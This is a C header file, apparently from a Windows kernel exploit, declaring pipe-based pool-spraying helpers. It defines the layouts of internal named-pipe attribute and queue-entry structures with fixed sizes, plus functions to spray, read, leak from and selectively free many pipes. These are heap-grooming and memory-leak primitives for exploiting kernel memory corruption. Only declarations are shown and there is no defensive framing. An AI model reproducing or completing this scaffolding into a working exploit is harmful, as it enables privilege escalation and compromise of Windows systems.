#ifndef PIPE_UTILS_H
#define PIPE_UTILS_H

#include <stdio.h>
#include <windows.h>
#include <stdint.h>


#define ATTRIBUTE_NAME      "Z"
#define ATTRIBUTE_NAME_LEN  sizeof(ATTRIBUTE_NAME)

#define DUMB_ATTRIBUTE_NAME "DUMB1"
#define DUMB_ATTRIBUTE_NAME_LEN  sizeof(DUMB_ATTRIBUTE_NAME)

#define DUMB_ATTRIBUTE_NAME2 "DUMB2"
#define DUMB_ATTRIBUTE_NAME2_LEN  sizeof(DUMB_ATTRIBUTE_NAME2)

#define LEN_OF_PIPE_ATTRIBUTE_STRUCT 0x28
#define LEN_OF_PIPE_QUEUE_ENTRY_STRUCT 0x30


typedef enum spray_type {
    SPRAY_PIPE_QUEUE_ENTRY,
    SPRAY_PIPE_ATTRIBUTE
} spray_type_t;

typedef struct pipe_pair{
    HANDLE write;
    HANDLE read;
} pipe_pair_t;

typedef struct pipe_spray{
    size_t nb;
    size_t bufsize;
    char * data_buf;
    spray_type_t type;
    pipe_pair_t pipes[1];
} pipe_spray_t;

typedef struct pipe_attribute {
  LIST_ENTRY list;
  char * AttributeName;
  uint64_t ValueSize;
  char * AttributeValue;
  char data[0];
} pipe_attribute_t;

typedef struct pipe_queue_entry {
  LIST_ENTRY list;
  uintptr_t field_10;
  uintptr_t security;
  unsigned long field_20;
  unsigned long remaining_bytes;
  unsigned long DataSize;    
  unsigned long field_2C;
  char data[0];
} pipe_queue_entry_t;

typedef struct pipe_queue_entry_sub {
    uint64_t unk;
    uint64_t unk1;
    uint64_t unk2;
    uint64_t data_ptr;
}pipe_queue_entry_sub_t;


int prepare_pipe(size_t bufsize, pipe_pair_t * pipe_pair);
pipe_spray_t * prepare_pipes(size_t nb, size_t size, char * data, spray_type_t type);

int spray_pipes(pipe_spray_t * pipe_spray);

int write_pipe(pipe_pair_t * pipe_pair, char * data, size_t bufsize);
int read_pipe(pipe_pair_t * pipe_pair, char * out, size_t bufsize);

int set_pipe_attribute(pipe_pair_t *target_pipe, char * data, size_t size);
int get_pipe_attribute(pipe_pair_t *target_pipe, char * out, size_t size);


int read_pipes(pipe_spray_t * pipe_spray, char * leak);

int close_pipe(pipe_pair_t * pipe_pair);
void free_pipes(pipe_spray_t * pipe_spray);
void free_third_pipes(pipe_spray_t *pipe_spray, int start);

#endif
